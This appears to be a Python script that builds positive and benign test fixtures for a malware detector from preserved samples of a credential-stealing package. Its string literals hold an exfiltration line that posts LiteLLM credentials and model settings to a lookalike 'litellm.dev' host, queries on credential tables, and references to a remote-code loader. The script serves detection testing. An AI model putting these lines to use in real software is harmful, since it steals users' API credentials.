#!/usr/bin/env python3
"""Rebuild controls in cleave's fixture tree from the preserved article samples."""
import argparse
import base64
import json
from pathlib import Path
import zlib

parser = argparse.ArgumentParser()
parser.add_argument('--samples', type=Path, required=True)
parser.add_argument('--fixtures', type=Path, required=True)
args = parser.parse_args()
positive = args.fixtures / 'positive'
benign = args.fixtures / 'benign'
positive.mkdir(parents=True, exist_ok=True)
benign.mkdir(parents=True, exist_ok=True)
wrapper = (args.samples / 'suspicious/cook.py').read_text()
blob = wrapper.split("b64decode('")[1].split("')")[0]
collector = zlib.decompress(base64.b64decode(blob)).decode()
loader = (args.samples / 'hostile/sitecustomize.py').read_text()
js = (args.samples / 'suspicious/provider-export.js').read_text()
ts = (args.samples / 'suspicious/provider-export.ts').read_text()
for name, text in {
    'collector.py': collector, 'cook.py': wrapper, 'sitecustomize.py': loader,
    'collector.js': js, 'collector.ts': ts,
    'httpx_collector.py': collector.replace('import requests', 'import httpx').replace(
        'requests.post', 'httpx.put').replace('www.litellm.dev/healthcheck', 'changed.invalid/upload'),
    'renamed_loader.py': loader.replace('fetch_text', 'read_remote').replace(
        'exec_code', 'apply_source').replace('code', 'source').replace(
        'domain.txt', 'node.cfg').replace('/codepy', '/stage').replace('3600', '2700'),
}.items():
    (positive / name).write_text(text)
backup = collector.replace(
    "requests.post('http://www.litellm.dev/healthcheck', json={'credentials': credentials, 'models': models})",
    "open('backup.json', 'w').write(json.dumps({'credentials': credentials, 'models': models}))")
for name, text in {
    'backup.py': backup,
    'star_backup.py': backup.replace('"credential_name", "credential_values"', '*').replace(
        '"model_name", "litellm_params"', '*'),
    'unrelated_post.py': collector.replace("json={'credentials': credentials, 'models': models}",
        "json={'status': 'ok'}"),
    'overwritten.py': collector.replace('    requests.post',
        '    credentials = []\n    models = []\n    requests.post'),
    'counts.py': collector.replace('"credential_name", "credential_values"', 'COUNT(*)').replace(
        '"model_name", "litellm_params"', 'COUNT(*)'),
    'column_counts.py': collector.replace('"credential_name", "credential_values"',
        'COUNT(credential_values)').replace('"model_name", "litellm_params"', 'COUNT(litellm_params)'),
    'names_only.py': collector.replace('"credential_name", "credential_values"', '"credential_name"').replace(
        '"model_name", "litellm_params"', '"model_name"'),
    'table_prefix.py': collector.replace('LiteLLM_CredentialsTable', 'LiteLLM_CredentialsTableArchive').replace(
        'LiteLLM_ProxyModelTable', 'LiteLLM_ProxyModelTableArchive'),
    'comment_only.py': '\n'.join('# ' + line for line in collector.splitlines()),
    'query_prose.py': 'import requests\ntext = ' + repr(collector) +
        "\nrequests.post('https://example.invalid', json={'note': text})\n",
    'overwritten_loader.py': loader.replace('            await exec_code(code)',
        '            code = "print(1)"\n            await exec_code(code)'),
    'unrelated_loader.py': loader.replace('await exec_code(code)', 'await exec_code("print(1)")'),
    'sitecustomize.py': 'import os\nos.environ["PYTHONUTF8"] = "1"\n',
    'overwritten.js': js.replace('  await fetch', '  credentials.rows = [];\n  await fetch').replace(
        'JSON.stringify({credentials, models})', 'JSON.stringify({status: "ok"})'),
    'dynamic_base64.py': "codec = __import__('base64')\n",
    'quoted_base64.py': 'template = "__import__(\'base64\')"\n',
}.items():
    (benign / name).write_text(text)
queries = ['SELECT "credential_name", "credential_values" FROM "LiteLLM_CredentialsTable" LIMIT 500',
           'SELECT "model_name", "litellm_params" FROM "LiteLLM_ProxyModelTable" LIMIT 500']
q0, q1 = map(json.dumps, queries)
(benign / 'backup.go').write_text('package main\nimport "database/sql"\nfunc backup(db *sql.DB) {\n db.Query(' +
    q0 + ')\n db.Query(' + q1 + ')\n}\n')
(benign / 'backup.rb').write_text('def backup(db)\n db.execute(' + q0 + ')\n db.execute(' + q1 + ')\nend\n')
(benign / 'Backup.java').write_text('import java.sql.*;\nclass Backup { void backup(Statement db) throws SQLException {\n db.executeQuery(' +
    q0 + ');\n db.executeQuery(' + q1 + ');\n}}\n')
(benign / 'backup.php').write_text("<?php\nfunction backup($db) {\n pg_query($db, '" + queries[0] +
    "');\n pg_query($db, '" + queries[1] + "');\n}\n")
(benign / 'dynamic_zlib.py').write_text("codec = __import__('zlib')\n")
(benign / 'quoted_zlib.py').write_text('template = "__import__(\'zlib\')"\n')
print('Rebuilt 29 focused fixtures')
